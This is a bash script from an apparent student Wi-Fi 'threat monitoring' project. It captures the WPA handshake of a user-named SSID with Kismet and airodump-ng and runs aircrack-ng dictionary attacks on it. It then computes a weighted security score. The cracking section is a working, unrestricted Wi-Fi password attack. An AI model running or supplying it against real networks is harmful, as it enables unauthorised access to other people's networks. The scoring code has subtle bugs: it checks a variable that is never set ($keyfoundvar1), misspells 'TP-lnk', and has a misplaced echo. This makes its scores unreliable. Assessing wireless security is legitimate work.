#Contributors: Sai Prathik, Nikhil Pinto, Vidushi Razdan
#@uthor 1: Sai Prathik
#@uthor 2: Nikhil Pinto

#The entire shell script of our project titled "Network-Threat-Monitoring-System"


#!/bin/bash


#A custom timeout function created to kill a process after a specific amount of time. This is helpful since a there are a #lot of processes that run indefinitely and the requirement of the process is only for a short amount of time. Hence in #shell script this is used as an alternative to Ctrl + C.
custom_timeout() {
  time=$1

  command="/bin/sh -c \"$2\""

  expect -c "set echo \"-noecho\"; set timeout $time; spawn -noecho $command; expect timeout { exit 1 } eof { exit 0 }"

  if [ $? = 1 ] ; then
    echo "Timeout after ${time} seconds"
  fi

}

echo "Enter the SSID in quotes" 
read i
#i --> Wifi Name
#echo "$i"

#The output file of kismet is always stored in a standard format. Thus to extract only the required information we first #find the SSID of the entered network and then navigate up and down by a fixed distance to get the parameters. As the file #is always stored in a standard form, the distance from the SSID does not change. Thus the below variables store the #location (Line number) of each parameter for later extraction.
slash="/"
#location of BSSID, required for aircrack-ng
loc="/{ print NR-3}"
addr=$slash$i$loc

#location of Channel, required for aircrack-ng
loc2="/{ print NR+10}"
addr2=$slash$i$loc2

#location of Manufacturer, one of the parameters in the score model
loc3="/{ print NR-7}"
addr3=$slash$i$loc3

#location of Encryption2, one of the parameters in the score model
loc4="/{ print NR+8}"
addr4=$slash$i$loc4

#location of WPA Version, one of the parameters in the score model
loc5="/{ print NR+7}"
addr5=$slash$i$loc5


#Kill all background processes before starting Kismet
killall NetworkManager
killall NetworkManagerDispatcher
killall wpa_supplicant
killall avahi-daemon

#echo "test1"
#Start Kismet and Run it for 30 seconds
custom_timeout 30 "kismet_server daemonize"

#Sleep for another 10 seconds after aborting Kismet
sleep 10

#Kismet caputres information of various networks within suitable range. From all the numerous networks we need to read only #the parameters of the required Wifi Network and filter out the rest. Thus we read only the required parameters of the #entered SSID and save each parameter to a text file for further processing.
while read l
do
	echo $l
done < <(awk "$addr" Kismet-1.nettxt)
#save the required String at line number = addr to variable 
temp=( $(awk "$addr" Kismet-1.nettxt) )

#write the String to a .txt file
sed -n "$temp"p Kismet-1.nettxt > bssid.txt

#get entire string after ':' i.e save only the value
bssid=( $(sed 's/[^,:]*://p' bssid.txt | head -1) ) 
echo "BSSID $bssid"

#Repeat process for other parameters
temp1=( $(awk "$addr2" Kismet-1.nettxt) )
sed -n "$temp1"p Kismet-1.nettxt > channel.txt 
channel=( $(sed 's/[^,:]*://p' channel.txt | head -1) )
echo "Channel $channel"

temp2=( $(awk "$addr3" Kismet-1.nettxt) )
sed -n "$temp2"p Kismet-1.nettxt > manufacturer.txt 
manufact=( $(sed 's/[^,:]*://p' manufacturer.txt | head -1) )
echo "Manufacturer $manufact"

temp4=( $(awk "$addr4" Kismet-1.nettxt) )
sed -n "$temp4"p Kismet-1.nettxt > encryption2.txt 
ep2=( $(sed 's/[^,:]*://p' encryption2.txt | head -1) ) 
echo "Encryption2 $ep2"

temp5=( $(awk "$addr5" Kismet-1.nettxt) )
sed -n "$temp5"p Kismet-1.nettxt > open.txt 
open_encryption=( $(sed 's/[^,:]*://p' open.txt | head -1) )
#echo "WPA Version $open_encryption"


#Start airodump-ng which monitors available networks and run for 10 seconds
custom_timeout 10 "airodump-ng wlan0mon"

#Using acquired data from Kismet start airodump-ng for 10 seconds for the required BSSID to capture the WPA Handshake
custom_timeout 10 "airodump-ng -c $channel -w /root/six --bssid $bssid wlan0mon"

#After capturing the handshake, use aircrack to crack the password using different dictionaries and save the result in a #text file. First use a dictionary consisting of only vowels.
aircrack-ng -w /root/Desktop/mini_project/crunch.txt /root/six-01.cap | tee password.txt

#Check if password is cracked
cat password.txt | grep -q "KEY"

if [ $? = 0 ]; then
	keyfoundvar=1
	echo "Key 1 Found"
else 
	keyfoundvar=0
	echo "Key 1 Not Found"
fi
sleep 5

#If not cracked, try another dictonary of numbers 
aircrack-ng -w /root/Desktop/mini_project/crunch_1to5.txt /root/six-01.cap | tee password2.txt
cat password2.txt | grep -q "KEY"

if [ $? = 0 ]; then
	keyfoundvar2=1
	echo "Key 2 Found"
else 
	keyfoundvar2=0
	echo "Key 2 Not Found"
fi
sleep 5

#If not cracked, try another dictonary of alpha-numeric values.
aircrack-ng -w /root/Desktop/mini_project/abc123.txt /root/six-01.cap | tee password3.txt
cat password3.txt | grep -q "KEY"

if [ $? = 0 ]; then
	keyfoundvar3=1
	echo "Key 3 Found"
else 
	keyfoundvar3=0
	echo "Key 3 Not Found"
fi


##################################################SCORE MODEL#####################################################

#Check the type of encryption employed by the Wifi and give the score accordingly
Encrypt=0
weight_encrypt=5
#Encryption = "$ep1"
if [ "$ep2" == "WPA+AES-CCM" ]; then
	Encrypt=$( expr 4 \* $weight_encrypt )
	elif [ "$ep2" == "WPA+PSK" ]; then
	Encrypt=$( expr 3 \* $weight_encrypt )
	elif [ "$ep2" == "WPA+TKIP" ]; then
	Encrypt=$( expr 2 \* $weight_encrypt )
	elif [ "$ep2" == "WEP" ]; then
	Encrypt=$(  expr 1 \* $weight_encrypt  )
	else
	Encrypt=0
fi
echo "Encryptionscoreis$Encrypt"

#Check if the key is cracked and using which dictionary it's cracked and give the score accordingly
KEY=0
key_weight=2
if [ "$keyfoundvar3" == 1 ]; then
	KEY=$( expr 3 \* $key_weight )
	elif [ "$keyfoundvar1" == 1 ]; then
	KEY=$( expr 2 \* $key_weight )
	elif [ "$keyfoundvar2" == 1 ]; then
	KEY=$( expr 1 \* $key_weight )   
	elif [ "$open_encryption" == "None" ]; then
	KEY=0   		
	else
	KEY=30
	   	
echo "KeyStrengthis$KEY"
fi

#Check the make of the Wifi Router used
Manufact=0
weight_manufact=1

if [ "$manufact" == "Cisco" ]; then
	Manufact=$( expr 5 \* $weight_manufact )
	elif [ "$manufact" == "D-link" ]; then
	Manufact=$( expr 4 \* $weight_manufact )
	elif [ "$manufact" == "Netgear" ]; then
	Manufact=$( expr 3 \* $weight_manufact )
	elif [ "$manufact" == "TP-lnk" ]; then
	Manufact=$(  expr 2 \* $weight_manufact  )
	else
	Manufact=0
fi
echo "Manufacturerscoreis$Manufact"

#Predefined and it checks if the Wifi signal is detected within the organization itself
Range=10
echo "Rangescoreis$Range"

#Checks if the Wifi is opearated only during working hours and turned off otherwise.
Timing=15
echo "Timingscoreis$Timing"

#Checks how frequently the Wifi password is changed
Frequency=10
echo "Frequencyscoreis$Frequency"

#SNR=0
#echo "SNRscoreis$SNR"

#Checks the security encryption of a website
SSL=10
echo "SSLscoreis$SSL"


#Calualtes the total score and classifies it into 3 categories accordingly
total_score=$( expr $Encrypt + $KEY + $Manufact + $Range + $Timing + $Frequency + $SSL )
if (( $total_score >= 85 )); then
	security="Secure"
	elif (( $total_score >= 60 )); then
	security="Moderately Secure"
	else
	security="Not Secure"
fi

#Writes the data including score and other parameters to a textfile which is then used to upload to the server.
echo $total_score.$Encrypt.$KEY.$Manufact.$Range.$Timing.$Frequency.$SSL.$i.$security. >> /var/www/html/result.txt
echo $total_score.$Encrypt.$KEY.$Manufact.$Range.$Timing.$Frequency.$SSL.$i.$security. 
#$total_score.$Encrypt.$KEY.$Manufact.$Range.$Timing.$Frequency.$SSL.$i >> /var/www/html/result.txt
sleep 5

#restart the background processes that were killed at the beginning. Connect to the Wifi network again.
service network-manager restart